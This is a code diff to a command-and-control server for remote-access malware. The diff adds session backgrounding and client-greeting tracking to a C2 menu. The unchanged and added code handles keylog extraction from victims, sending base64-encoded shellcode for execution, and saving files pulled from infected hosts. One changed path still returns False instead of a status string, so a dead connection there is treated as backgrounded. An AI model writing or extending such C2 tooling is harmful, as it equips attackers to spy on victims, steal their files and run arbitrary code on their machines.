@@ -48,6 +48,7 @@ class ClientManager:
     def __init__(self):
         self.lock = threading.Lock()
         self.clients: dict[int, tuple] = {}
+        self.greeted: set[int] = set()
         self.next_id = 1
 
     def add(self, conn, addr) -> int:
@@ -60,6 +61,7 @@ class ClientManager:
 
     def remove(self, cid):
         with self.lock:
+            self.greeted.discard(cid)
             return self.clients.pop(cid, None)
 
     def list_clients(self):
@@ -69,6 +71,14 @@ class ClientManager:
     def get(self, cid):
         with self.lock:
             return self.clients.get(cid)
+
+    def mark_greeted(self, cid):
+        with self.lock:
+            self.greeted.add(cid)
+
+    def has_greeted(self, cid) -> bool:
+        with self.lock:
+            return cid in self.greeted
 
 
 def accept_clients(manager: ClientManager):
@@ -133,65 +143,72 @@ def parse_file_response(out):
             pass
     return None, None
 
-def interactive_session(conn, addr, cid: int):
-    initial = recv_until_prompt(conn)
-    if initial is None:
-        return False
-    init_text = initial.decode(errors="ignore")
-    extract_keylog_lines(cid, init_text)
-    print(init_text, end="", flush=True)
+def interactive_session(conn, addr, cid: int, read_initial=True):
+    prompt = ">> "
+    if read_initial:
+        initial = recv_until_prompt(conn, prompt.encode())
+        if initial is None:
+            return "exit"
+        init_text = initial.decode(errors="ignore")
+        extract_keylog_lines(cid, init_text)
+        print(init_text, end="", flush=True)
     while True:
         try:
             line = input()
         except (EOFError, KeyboardInterrupt):
             print()
-            return True
+            return "background"
         if not line:
             continue
         line = line.strip()
         if line in ("exit", "quit", "/quit"):
             conn.sendall((line + "\n").encode())
             time.sleep(0.3)
-            return False
-        if line.startswith("download "):
-            parts = line.split(" ", 1)
-            if len(parts) < 2:
-                continue
-            fname = parts[1].strip()
-            if not os.path.exists(fname):
-                print(f"File not found: {fname}")
-                continue
-            send_chunked_file(conn, "download", fname)
-        elif line.startswith("shellcode "):
-            parts = line.split(" ", 1)
-            if len(parts) < 2:
-                print("Usage: shellcode <filepath>")
-                continue
-            fname = parts[1].strip()
-            if not os.path.exists(fname):
-                print(f"File not found: {fname}")
-                continue
-            with open(fname, "rb") as f:
-                data = f.read()
-            b64 = base64.b64encode(data).decode()
-            cmd = f"shellcode {b64}\n"
-            conn.sendall(cmd.encode())
-        else:
-            conn.sendall((line + "\n").encode())
-        response = recv_until_prompt(conn)
-        if response is None:
-            return False
-        out = response.decode(errors="ignore")
-        extract_keylog_lines(cid, out)
-        if out.endswith(prompt):
-            out = out[:-len(prompt)]
-        out_clean = out.rstrip("\n")
-        fname, fdata = parse_file_response(out_clean)
-        if fname and fdata:
-            with open(fname, "wb") as f:
-                f.write(fdata)
-            print(f"[Saved file: {fname} ({len(fdata)} bytes)]")
-        print(out, end="", flush=True)
+            return "exit"
+        if line == "background":
+            return "background"
+        try:
+            if line.startswith("download "):
+                parts = line.split(" ", 1)
+                if len(parts) < 2:
+                    continue
+                fname = parts[1].strip()
+                if not os.path.exists(fname):
+                    print(f"File not found: {fname}")
+                    continue
+                send_chunked_file(conn, "download", fname)
+            elif line.startswith("shellcode "):
+                parts = line.split(" ", 1)
+                if len(parts) < 2:
+                    print("Usage: shellcode <filepath>")
+                    continue
+                fname = parts[1].strip()
+                if not os.path.exists(fname):
+                    print(f"File not found: {fname}")
+                    continue
+                with open(fname, "rb") as f:
+                    data = f.read()
+                b64 = base64.b64encode(data).decode()
+                cmd = f"shellcode {b64}\n"
+                conn.sendall(cmd.encode())
+            else:
+                conn.sendall((line + "\n").encode())
+            response = recv_until_prompt(conn, prompt.encode())
+            if response is None:
+                return False
+            out = response.decode(errors="ignore")
+            extract_keylog_lines(cid, out)
+            if out.endswith(prompt):
+                out = out[:-len(prompt)]
+            out_clean = out.rstrip("\n")
+            fname, fdata = parse_file_response(out_clean)
+            if fname and fdata:
+                with open(fname, "wb") as f:
+                    f.write(fdata)
+                print(f"[Saved file: {fname} ({len(fdata)} bytes)]")
+            print(out, end="", flush=True)
+        except Exception as e:
+            print(f"Error: {e}")
 
 
 def multi_run(manager: ClientManager, cmdline: str, timeout=15):
@@ -387,20 +404,25 @@ def c2_menu(manager: ClientManager):
                 print(f"Client {cid} not found")
                 continue
             conn, addr = client
+            first_select = not manager.has_greeted(cid)
+            if first_select:
+                manager.mark_greeted(cid)
             print(f"[Selected client {cid}, entering interactive session]")
             print("[Type exit/quit to return to menu]")
             try:
-                alive = interactive_session(conn, addr, cid)
+                result = interactive_session(conn, addr, cid, read_initial=first_select)
             except Exception as e:
                 print(f"Session error: {e}")
-                alive = False
-            if not alive:
+                result = "exit"
+            if result == "exit":
                 manager.remove(cid)
                 try:
                     conn.close()
                 except Exception:
                     pass
-            print(f"[Session with client {cid} ended]")
+                print(f"[Session with client {cid} ended]")
+            else:
+                print(f"[Backgrounded session with client {cid}]")
         elif cmd == "build":
             if len(parts) < 2:
                 print("Usage: build <target>")
